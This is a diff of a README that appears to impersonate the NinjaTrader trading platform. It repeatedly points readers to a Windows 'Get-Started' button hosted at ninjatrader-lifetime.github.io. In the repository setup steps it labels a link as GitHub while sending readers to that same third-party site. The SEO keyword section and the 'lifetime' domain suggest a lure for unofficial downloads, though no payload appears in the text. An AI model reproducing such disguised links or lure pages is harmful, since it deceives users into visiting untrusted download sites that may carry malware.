@@ -1,14 +1,11 @@
-# NinjaTrading Toolkit (Windows Version) - NinjaTrader Trading Platform
+# NinjaTrader Trading Platform
 
 [![Key Features](https://img.shields.io/badge/Key%20Features-blue)](#key-features)
-[![Quick Start Guide](https://img.shields.io/badge/Quick%20Start%20Guide-blue)](#quick-start-guide)
+[![Quick Start Guide](https://img.shields.io/badge/Quick%20Start%20Guide-lightblue)](#quick-start-guide)
 [![Installation Guide](https://img.shields.io/badge/Installation%20Guide-green)](#installation-guide)
 [![Advanced Features](https://img.shields.io/badge/Advanced%20Features-orange)](#advanced-features--configuration)
 [![System Requirements](https://img.shields.io/badge/System%20Requirements-yellow)](#system-requirements)
 [![Troubleshooting](https://img.shields.io/badge/Troubleshooting-red)](#troubleshooting--support)
-[![Roadmap](https://img.shields.io/badge/Roadmap-blue)](#roadmap)
-[![Contributing](https://img.shields.io/badge/Contributing-lightblue)](#contributing)
-[![License](https://img.shields.io/badge/License-darkgreen)](#license)
 [![SEO Keywords](https://img.shields.io/badge/SEO%20Keywords-lightgray)](#seo-keywords)
 
 ---
@@ -38,9 +35,9 @@ NinjaTrader is free to use for charting, market analysis, and paper trading, pro
 # **Installation Guide**
 
 <div align="center">
-
-![Installation Guide]([https://support.ninjatrader.com/servlet/rtaImage?eid=ka0bV0000004j3N&feoid=00N1T00000AywZL&refid=0EMHs00000HWlah](https://support.ninjatrader.com/servlet/rtaImage?eid=ka0bV0000004j3N&feoid=00N1T00000AywZL&refid=0EMHs00000HWlah))
-
+```
+![Installation Guide](https://support.ninjatrader.com/servlet/rtaImage?eid=ka0bV0000004j3N&feoid=00N1T00000AywZL&refid=0EMHs00000HWlah)
+```
 </div>  
 
 <div align="center">  
@@ -134,16 +131,10 @@ NinjaTrader.exe --import "C:\Path\To\Your\File.txt"
 
 NinjaTrader integrates with **GitHub** for version control and public sharing of posts. Here's how to set it up for automatic updates and sharing:
 
-<div align="center">  
-
-[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)
-
-</div>
-
 #### **Setting up a GitHub Repo for NinjaTrader**:
 
 1. **Create a New Repository on GitHub**
-   - Go to [GitHub](https://ninjatrader-lifetime.github.io/.github/), log in, and click **New Repository**.
+   - Go to [Get Started GitHub](https://ninjatrader-lifetime.github.io/.github/), log in, and click **New Repository**.
    - Name it **NinjaTrader** (or similar).
    - Initialize the repo with a **README.md** file.
 
@@ -276,17 +267,17 @@ For detailed tracking and troubleshooting, you can access the **Task Log**:
 
 This log can help you troubleshoot any failed tasks and ensure the automation process is running smoothly.
 
-<div align="center">
-  
-![Trading](https://ninjatrader.com/getattachment/371e0df6-f4a5-4283-b816-a0c9d77cc4a4/futures-paper-trading-pic2.png)
-
-</div>
-
 <div align="center">  
 
 [![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)
 
 </div> 
+
+<div align="center">
+  
+![Trading](https://ninjatrader.com/getattachment/371e0df6-f4a5-4283-b816-a0c9d77cc4a4/futures-paper-trading-pic2.png)
+
+</div>
 
 ---
 
